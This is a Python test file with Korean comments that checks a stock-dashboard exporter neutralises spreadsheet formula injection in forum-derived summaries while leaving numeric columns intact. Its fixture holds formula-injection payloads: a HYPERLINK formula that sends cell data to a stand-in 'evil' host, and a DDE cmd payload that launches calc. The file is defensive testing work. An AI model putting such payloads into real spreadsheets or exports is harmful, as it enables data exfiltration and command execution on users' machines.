"""save_data의 엑셀/CSV 수식 인젝션 방어 테스트.

네이버 종토방 게시글 제목은 아무나 쓸 수 있고, 그 내용이 Gemini 요약·감성
결과(posts_summary, sentiment, keywords)에 그대로 실려 CSV/XLSX로 저장된다.
사용자가 대시보드에서 "엑셀 다운로드"로 이 파일을 열면, 값이
'=HYPERLINK(...)'처럼 '='로 시작할 경우 openpyxl이 그 셀을 수식
(data_type='f')으로 저장하고 엑셀이 그대로 실행한다. CSV로 열 때는
'+'·'-'·'@'로 시작해도 엑셀이 수식으로 오인할 수 있다.

숫자 컬럼(change_rate 등)은 절대 건드리면 안 된다 — 음수가 문자열이 되면
분석(정렬·비교)이 깨진다.
"""
import sys, os, csv
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))

from datetime import datetime

import pandas as pd
import pytest
from openpyxl import load_workbook


@pytest.fixture(autouse=True)
def chdir_tmp(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)


def malicious_df():
    return pd.DataFrame([
        {'종목명': '정상종목', 'code': '000001', 'change_rate': -1.5,
         'posts_summary': '=HYPERLINK("http://evil/?d="&A1,"x")',
         'sentiment': '+강한 긍정', 'keywords': '@위험키워드'},
        {'종목명': '정상종목2', 'code': '000002', 'change_rate': 2.3,
         'posts_summary': "=cmd|'/c calc'!A1",
         'sentiment': '-강한 부정', 'keywords': '정상키워드'},
    ])


def test_xlsx_수식_셀이_무력화된다():
    """posts_summary 등 문자열 컬럼의 '=...' 값이 openpyxl 수식으로 저장되면 안 된다."""
    from src.strategy.record_writer import save_data

    save_data(malicious_df(), start_time=datetime(2026, 7, 11, 10, 0, 0))

    wb = load_workbook('data/trending_integrated.xlsx')
    ws = wb['Trending_Stocks']
    for row in ws.iter_rows(min_row=2):
        for cell in row:
            assert cell.data_type != 'f', f"{cell.coordinate}={cell.value!r} 가 수식으로 저장됨"


def test_xlsx_숫자_컬럼_음수는_그대로_숫자로_남는다():
    """change_rate 같은 숫자 컬럼은 무력화 대상이 아니다. 음수가 문자열이 되면 분석이 깨진다."""
    from src.strategy.record_writer import save_data

    save_data(malicious_df(), start_time=datetime(2026, 7, 11, 10, 0, 0))

    wb = load_workbook('data/trending_integrated.xlsx')
    ws = wb['Trending_Stocks']
    header = [c.value for c in ws[1]]
    col_idx = header.index('change_rate') + 1
    values = [ws.cell(row=r, column=col_idx).value for r in (2, 3)]
    assert values == [-1.5, 2.3]
    for r in (2, 3):
        assert ws.cell(row=r, column=col_idx).data_type == 'n'


def test_csv에서도_플러스_마이너스_골뱅이_시작_문자열이_무력화된다():
    """CSV는 openpyxl의 data_type 판정이 없다 — 검증자 확인대로 '+ - @'도
    엑셀이 CSV를 열 때 수식으로 오인할 수 있어 CSV 쪽도 방어해야 한다."""
    from src.strategy.record_writer import save_data

    save_data(malicious_df(), start_time=datetime(2026, 7, 11, 10, 0, 0))

    with open('data/trending_integrated.csv', encoding='utf-8-sig', newline='') as f:
        rows = list(csv.DictReader(f))

    assert rows[0]['posts_summary'].startswith("'=")
    assert rows[0]['sentiment'].startswith("'+")
    assert rows[0]['keywords'].startswith("'@")
    assert rows[1]['posts_summary'].startswith("'=")
    assert rows[1]['sentiment'].startswith("'-")


def test_csv_숫자_컬럼_음수는_무력화되지_않는다():
    """change_rate의 -1.5가 CSV에서도 그대로 -1.5여야 한다(따옴표 접두 없이)."""
    from src.strategy.record_writer import save_data

    save_data(malicious_df(), start_time=datetime(2026, 7, 11, 10, 0, 0))

    with open('data/trending_integrated.csv', encoding='utf-8-sig', newline='') as f:
        rows = list(csv.DictReader(f))

    assert rows[0]['change_rate'] == '-1.5'
    assert rows[1]['change_rate'] == '2.3'


def test_안전한_문자열_값은_그대로_보존된다():
    """무력화 로직이 정상 데이터까지 건드리면 안 된다(대시보드 표시가 바뀜)."""
    from src.strategy.record_writer import save_data

    df = pd.DataFrame([
        {'종목명': '금호건설', 'code': '002990', '현재가': 17940,
         '게시물': 90, 'posts_summary': '평범한 요약입니다', '상태': '활성'},
    ])
    save_data(df, start_time=datetime(2026, 7, 11, 10, 0, 0))

    wb = load_workbook('data/trending_integrated.xlsx')
    ws = wb['Trending_Stocks']
    header = [c.value for c in ws[1]]
    col_idx = header.index('posts_summary') + 1
    assert ws.cell(row=2, column=col_idx).value == '평범한 요약입니다'
